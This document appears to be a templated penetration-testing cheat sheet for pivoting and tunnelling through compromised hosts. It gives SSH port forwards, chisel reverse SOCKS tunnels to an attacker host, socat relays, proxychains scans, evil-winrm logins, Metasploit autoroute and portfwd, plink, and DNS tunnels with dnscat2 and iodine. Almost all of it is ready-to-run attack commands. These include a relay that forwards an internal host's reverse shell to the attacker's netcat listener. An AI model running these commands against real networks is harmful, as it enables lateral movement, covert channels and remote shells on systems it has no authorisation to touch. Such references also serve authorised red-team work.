# Local port forward (access remote service locally)
ssh -L {{proxy_port}}:127.0.0.1:{{service_port}} {{pivot_user}}@{{pivot_ip}}
# Now access: http://127.0.0.1:{{proxy_port}}

# Remote port forward (expose local service to target)
ssh -R {{lport}}:127.0.0.1:{{lport}} {{pivot_user}}@{{pivot_ip}}
# Target can now reach your listener at 127.0.0.1:{{lport}}

# Dynamic port forward (SOCKS proxy)
ssh -D {{socks_port}} {{pivot_user}}@{{pivot_ip}}
# Configure proxychains: socks5 127.0.0.1 {{socks_port}}
proxychains nmap -sT -Pn {{internal_ip}}

# Double pivot (supondo SSH ativo no host interno e segundo salto)
ssh -L {{tunnel_port}}:{{internal_ip}}:22 {{pivot_user}}@{{pivot_ip}}
ssh -L {{proxy_port}}:{{internal_ip_2}}:{{service_port}} -p {{tunnel_port}} {{pivot_user_2}}@127.0.0.1

# SSH over jump host
ssh -J {{pivot_user}}@{{pivot_ip}} {{pivot_user_2}}@{{internal_ip}}

# Attacker (server)
./chisel server -p {{proxy_port}} --reverse

# Target (client) - SOCKS proxy
./chisel client {{attacker_ip}}:{{proxy_port}} R:socks
# Creates SOCKS5 on attacker port {{socks_port}}
# Configure proxychains: socks5 127.0.0.1 {{socks_port}}

# Target (client) - Port forward
./chisel client {{attacker_ip}}:{{proxy_port}} R:{{tunnel_port}}:127.0.0.1:{{service_port}}
# Forwards target's 127.0.0.1:{{service_port}} to attacker's {{tunnel_port}}

# Target (client) - Multiple forwards
./chisel client {{attacker_ip}}:{{proxy_port}} R:{{tunnel_port}}:{{internal_ip}}:{{service_port}} R:{{tunnel_port_2}}:{{internal_ip}}:443

# Port forward
socat TCP-LISTEN:{{tunnel_port}},fork TCP:{{internal_ip}}:{{service_port}}

# Port forward with bind
socat TCP-LISTEN:{{tunnel_port}},bind=0.0.0.0,fork TCP:127.0.0.1:{{service_port}}

# Reverse connection relay
# Attacker: nc -lvnp {{lport}}
# Pivot host:
socat TCP-LISTEN:{{tunnel_port}},fork TCP:{{attacker_ip}}:{{lport}}
# Internal host reverse shell to pivot:{{tunnel_port}} -> forwarded to attacker:{{lport}}

# Config: /etc/proxychains4.conf
# Add at bottom:
socks5 127.0.0.1 {{socks_port}}

# Usage
proxychains nmap -sT -Pn {{internal_ip}}
proxychains curl http://{{internal_ip}}
proxychains ssh {{pivot_user}}@{{internal_ip}}
proxychains evil-winrm -i {{internal_ip}} -u '{{target_user}}' -p '{{password}}'

# Scan through proxy (fast)
proxychains -q nmap -sT -Pn -T4 --top-ports 100 {{internal_ip}}

# Add route through meterpreter session
meterpreter> run autoroute -s {{internal_net}}

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT {{socks_port}}
run -j

# Port forward
meterpreter> portfwd add -l {{proxy_port}} -p {{service_port}} -r {{internal_ip}}

# Local port forward
plink.exe -L {{proxy_port}}:127.0.0.1:{{service_port}} {{pivot_user}}@{{attacker_ip}}

# Remote port forward
plink.exe -R {{lport}}:127.0.0.1:{{lport}} {{pivot_user}}@{{attacker_ip}}

# Dynamic (SOCKS)
plink.exe -D {{socks_port}} {{pivot_user}}@{{attacker_ip}}

# dnscat2
# Server (attacker):
dnscat2-server {{tunnel_domain}}

# Client (target):
./dnscat2 {{tunnel_domain}}

# iodine
# Server:
iodined -f -c -P '{{password}}' {{tunnel_ip}} {{tunnel_domain}}
# Client:
iodine -f -P '{{password}}' {{tunnel_domain}}
